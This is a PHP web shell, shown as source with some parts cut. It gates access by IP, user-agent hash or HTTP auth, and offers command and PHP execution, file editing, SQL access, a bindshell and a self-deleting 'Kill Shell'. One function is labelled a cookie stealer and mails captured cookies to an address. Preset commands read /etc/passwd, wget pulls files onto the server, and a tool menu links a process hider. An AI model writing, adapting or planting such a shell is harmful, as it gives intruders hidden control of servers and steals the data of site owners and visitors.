...
$IP = ['127.0.0.2', '127.0.0.1']; // IP Addresses allowed to access shell
...
case 0: break;
case 1: if (md5($_SERVER['HTTP_USER_AGENT']) != $uakey) {
    hide();
} break;
case 2: if (!in_array($_SERVER['REMOTE_ADDR'], $IP)) {
    hide();
} break;
case 3: if (!$_SERVER['PHP_AUTH_USER']) {
    userauth();
} break;
}
...
if (!$act && !$cmd && !$cookie && !$f && !$dir && !$gf && !$img) {
    ...
    @mail("$email", 'Cookie Data', "$cookie", "From: $email");
    hide();
} // Cookie stealer function
elseif ('view' == $act && $f && $dir) {
    view($f, $dir);
} elseif ($img) {
    img($img);
} elseif ($gf) {
...
function cleandir($d)
{ // Function to clean up the $dir and $curdir variables
    $d = realpath($d);
    $d = str_replace('\\\\', '//', $d);
    $d = str_replace('////', '//', $d);
    $d = str_replace('\\', '/', $d);
...
{ // Main/menu function
    ...
    style();
    $act = ['cmd' => 'Command Execute', 'files' => 'File View', 'phpinfo' => 'PHP info', 'phpexec' => 'PHP Execute',
'tools' => 'Tools', 'sqllogin' => 'SQL', 'email' => 'Email', 'upload' => 'Get Files', 'lookup' => 'List Domains', 'bshell' => 'Bindshell', 'kill' => 'Kill Shell', ];
    ...
    if ('' != @ini_get('safe_mode')) {
        echo "<b>Safemode:</b> <font color='red'>ON</font>";
    } else {
        echo "<b>Safemode:</b> <font color='green'>OFF</font>";
    }
    echo "\n<br>\n";
    if ('' != @ini_get('open_basedir')) {
        echo "<b>Open Base Dir:</b> <font color='red'>ON</font> [ <span class='inf'>" . ini_get('open_basedir') . '</span> ]';
    } else {
        echo "<b>Open Base Dir:</b> <font color='green'>OFF</font>";
    }
    echo "\n<br>\n";
    if ('' != @ini_get('disable_functions')) {
        echo '<b>Disabled functions:</b> ' . @ini_get('disable_functions');
    } else {
        echo '<b>Disabled functions:</b> None';
    }
    echo "\n<br>\n";
    if (@function_exists(mysql_connect)) {
        echo "<b>MySQL:</b> <font color='green'>ON</font>";
    } else {
        echo "<b>MySQL:</b> <font color='red'>OFF</font>";
    }
    echo '</div>';
    ...
    if ($_SERVER['QUERY_STRING']) {
        foreach ($act as $link) {
            echo "[ <a href='?" . $_SERVER['QUERY_STRING'] . '&act=' . $capt[$link] . "' target='frm'>" . $link . '</a> ] ';
        }
    } else {
        foreach ($act as $link) {
            echo "[ <a href='?act=" . $capt[$link] . "' target='frm'>" . $link . '</a> ] ';
        }
    }
    echo '</center>';
    echo '<hr>';
...
{ // Command execution function
    ...
    $precmd = ['' => '', 'Read /etc/passwd' => 'cat /etc/passwd', 'Open ports' => 'netstat -an',
...
{ // File view function
    ...
    style();
    if ($_POST['contents'] && 'Save' == $_POST['fileact']) {
...
{ // Uploading backend function
    ...
    if (exec("wget $file -b -O $updir/$filex")) {
        die('File has been uploaded.');
    } else {
...
'xps.c (proc hider)' => 'http://packetstormsecurity.org/groups/shadowpenguin/unix-tools/xps.c', ];
    ...
    foreach ($tools as $tool) {
        echo "<option value='" . $tool . "'>" . $names[$tool] . "</option>\n";
    }
    echo '</select>';
